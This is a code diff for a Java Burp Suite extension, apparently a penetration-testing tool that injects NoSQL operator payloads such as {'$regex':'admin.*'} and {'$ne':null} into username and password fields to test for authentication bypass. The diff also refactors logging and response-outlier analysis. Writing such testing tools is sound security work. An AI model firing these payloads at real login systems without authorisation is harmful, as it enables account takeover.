@@ -36,6 +36,7 @@ public class NNN implements BurpExtension {
 
         // Payloads for username field
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin.*\"}"), "{\"$regex\":\"admin.*\"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin*\"}"), "{\"$regex\":\"admin*\"}", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("\"admin\""), "\"admin\"", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin.*\"}"), "{\"$regex \":\"admin.*\"}", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$ne\":null}"), "{\"$ne\":null}", null));
@@ -97,7 +98,7 @@ public class NNN implements BurpExtension {
         clearButton.setPreferredSize(new Dimension(200, clearButton.getPreferredSize().height));
         clearButton.addActionListener(e -> {
             tableModel.clear();
-            this.infoPane.setText("Log cleared");
+            this.infoPane.setText(infoPane.getText() +"[i] Logs were cleared\n");
         });
 
         // Panel to hold the button
@@ -187,11 +188,13 @@ public class NNN implements BurpExtension {
         double stdDev = calculateStandardDeviation(responseList, mean);
         // Find objects with instance parameter values that stand out
         ArrayList<HttpRequestResponse> outliers = findOutliers(responseList, mean, stdDev);
+        // Add to outliers responses with suspicious status codes
         for (HttpRequestResponse resp : responseList) {
             if (resp.response().statusCode() != 200 && resp.response().statusCode() != 400) {
                 outliers.add(resp);
             }
         }
+        // Remove duplicates from outliers
         outliers = removeDuplicates(outliers);
         // Sort outliers by status codes
         outliers.sort(new Comparator<HttpRequestResponse>() {
@@ -280,55 +283,57 @@ public class NNN implements BurpExtension {
     }
 
     static void authenticationUsernameTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
-        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
+        infoPane.setText(infoPane.getText() + "[i] Username Authentication Test\n");
         new Thread(() -> {
             try {
                 HttpRequest request2send;
                 HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
+                ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
                 for (Payload payload : payloadsArrayList){
                     if (payload.payloadType == PayloadType.AUTHENTICATION_BYPASS_USERNAME) {
                         if (requestResponse.request().method().equals("POST")) {
                             request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payload + requestResponse.request().toString().substring(endIndex));
-                            api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                             response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                         } else {
                             request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
-                            api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                             response2receive = api.http().sendRequest(request2send);
                         }
-                        api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
+                        responseList.add(response2receive);
                     }
                 }
+                printSuspiciousResponses(responseList);
             } catch (Exception e) {
-                api.logging().logToOutput("[!] Request failed");
+                api.logging().logToError("[!] Username Authentication module failed");
+                api.logging().logToError(e);
             }
         }).start();
     }
 
     static void authenticationPasswordTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
-        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
+        infoPane.setText(infoPane.getText() + "[i] Password Authentication Test\n");
         new Thread(() -> {
             try {
                 HttpRequest request2send;
                 HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
+                ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
                 for (Payload payload : payloadsArrayList){
                     if (payload.payloadType == PayloadType.AUTHENTICATION_BYPASS_PASSWORD) {
                         if (requestResponse.request().method().equals("POST")) {
                             request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payload + requestResponse.request().toString().substring(endIndex));
-                            api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                             response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                         } else {
                             request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
-                            api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                             response2receive = api.http().sendRequest(request2send);
                         }
-                        api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
+                        responseList.add(response2receive);
                     }
                 }
+                printSuspiciousResponses(responseList);
             } catch (Exception e) {
-                api.logging().logToOutput("[!] Request failed");
+                api.logging().logToError("[!] Password Authentication module failed");
+                api.logging().logToError(e);
             }
         }).start();
     }
@@ -354,7 +359,7 @@ public class NNN implements BurpExtension {
                                         request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startPasswordIndex) + payload2.payload + requestResponse.request().toString().substring(endPasswordIndex));
                                         request2send = HttpRequest.httpRequest(httpService, request2send.toString().substring(0, startUsernameIndex) + payload1.payload + request2send.toString().substring(endUsernameIndex));
                                     }
-                                    api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
+//                                    api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                                     response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                                     responseList.add(response2receive);
                                 } else {
@@ -365,11 +370,11 @@ public class NNN implements BurpExtension {
                                         request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startPasswordIndex) + payload2.payloadUrlEncoded + requestResponse.request().toString().substring(endPasswordIndex));
                                         request2send = HttpRequest.httpRequest(httpService, request2send.toString().substring(0, startUsernameIndex) + payload1.payloadUrlEncoded + request2send.toString().substring(endUsernameIndex));
                                     }
-                                    api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
+//                                    api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                                     response2receive = api.http().sendRequest(request2send);
                                     responseList.add(response2receive);
                                 }
-                                api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
+//                                api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
                             }
                         }
                     }
@@ -405,7 +410,8 @@ public class NNN implements BurpExtension {
                 }
 
             } catch (Exception e) {
-                api.logging().logToOutput("[!] Request failed");
+                api.logging().logToError("[!] Extract Field Names module failed");
+                api.logging().logToError(e);
             }
         }).start();
     }
